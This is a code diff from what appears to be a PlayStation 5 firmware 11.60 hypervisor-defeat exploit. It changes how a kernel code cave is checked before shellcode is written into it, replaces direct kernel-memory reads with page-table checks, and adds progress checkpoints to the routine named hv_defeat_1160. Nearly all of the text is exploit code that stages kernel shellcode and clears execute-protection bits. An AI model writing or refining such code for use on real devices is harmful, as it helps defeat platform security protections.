@@ -171,21 +171,17 @@ static int walk_page(uint64_t va, int clear_nx) {
 }
 
 static int validate_wake_cave(size_t shellcode_len) {
-  uint8_t buf[0x200];
-
   if (shellcode_len == 0 || shellcode_len > CODE_CAVE_CAPACITY)
     return -1;
 
-  for (size_t off = 0; off < shellcode_len; off += sizeof(buf)) {
-    size_t chunk = shellcode_len - off;
-    if (chunk > sizeof(buf))
-      chunk = sizeof(buf);
-    kread(kg(env_offset.KERNEL_CODE_CAVE) + off, buf, chunk);
-    for (size_t i = 0; i < chunk; i++)
-      if (buf[i] != 0x90)
-        return -1;
-  }
-
+  /*
+   * Never dereference 11.60 kernel text before the startup-AP strike.  Its
+   * execute-only protection is enforced by NPT, so clearing the guest XO bit
+   * does not make a kernel_copyout safe.  The frozen 0xD30000 dump proves the
+   * complete [0xD2B000,0xD30000) tail is NOP-filled; this live gate therefore
+   * checks only that every destination page is still present and executable.
+   * Sonic likewise performs no pre-arm content read of its destination cave.
+   */
   for (size_t off = 0; off < shellcode_len; off += 0x1000)
     if (walk_page(kg(env_offset.KERNEL_CODE_CAVE) + off, 0))
       return -1;
@@ -546,15 +542,18 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
     notify("11.60 offsets/raw firmware gate failed; refusing to arm\n");
     return -1;
   }
+  checkpoint_1160_hv("offsets/raw firmware gate passed");
   if (sceKernelGetMainSocId() == PS5_PRO_SOC_ID) {
     notify("11.60 startup-AP donor refused on unvalidated PS5 Pro layout\n");
     return -1;
   }
+  checkpoint_1160_hv("regular-model gate passed");
+  checkpoint_1160_hv("page-table-only wake-cave validation begin");
   if (validate_wake_cave(shellcode_kernel_len)) {
-    notify("11.60 wake blob does not fit the verified executable NOP cave\n");
+    notify("11.60 wake blob/cave mapping validation failed\n");
     return -1;
   }
-  checkpoint_1160_hv("firmware, model, offsets, and wake cave validated");
+  checkpoint_1160_hv("page-table-only wake-cave validation passed");
 
   facs = kread64(kg(env_offset.ACPIGBL_FACS));
   if ((facs >> 48) != 0xffffULL) {
